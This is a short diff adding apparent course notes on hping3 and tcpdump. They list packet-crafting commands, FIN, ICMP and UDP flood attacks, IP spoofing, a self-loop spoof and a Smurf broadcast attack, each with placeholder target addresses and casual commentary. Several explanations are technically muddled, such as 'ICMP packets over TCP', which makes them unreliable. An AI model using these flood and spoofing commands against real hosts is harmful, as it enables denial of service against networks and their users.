@@ -1,0 +1,33 @@
+HPING3
+    commands:
+        hping3
+            hping3 <TARGET IP>
+                normal ICMP packet
+            hping3 -p 100 <TARGET IP>
+                sending an ICMP packet on port 100
+            hping3 -S -p 100 <TARGET IP>
+                sending a SYN packet on port 100
+            hping3 -F -p 100 <TARGET IP>
+                sending a FIN packet on port 100
+            hping3 --flood -F -p 100 <TARGET IP>
+                flooding target with the FIN attack!
+            hping3 <-1|--icmp> --flood <TARGET IP>
+                flooding target with ICMP packets over TCP
+            hping3 <-2|--udp> --flood <TARGET IP>
+                flooding target with ICMP packets over UDP
+            hping3 --rand-source -p 100 <TARGET IP>
+                sending an ICMP packet by random fake SRC IP addresses
+            hping3 -S --spoof <FAKE IP> -p 100 <TARGET IP>
+                spoofing an IP address by sending SYN packets from a fake IP address
+                spoof attribute is for allowing program to make a packet with the SRC of someone else!
+            hping3 --icmp --spoof <FAKE IP> <TARGET IP>
+                spoofing an IP address by sending ICMP packets from a fake IP address. target can't send back an answer because there aren't any machines!
+            hping3 --icmp --spoof <VICTIM IP> <SAME IP>
+                to make a loop in the target system to send him back the answer and make him busy as we said in the last video :D
+            hping3 --icmp --spoof <VICTIM IP> <BROADCAST IP>
+                SMURF attack:
+                    as we talked about sending a BROADCAST packet to the network, everyone tries to send back a REPLY to the victim IP and it should process all of them. so it goes busy ;)
+        tcpdump
+            tcpdump <-p|port> 100
+                listening on port 100
+    all above commands can cause block your physical Port if port-security is enabled!
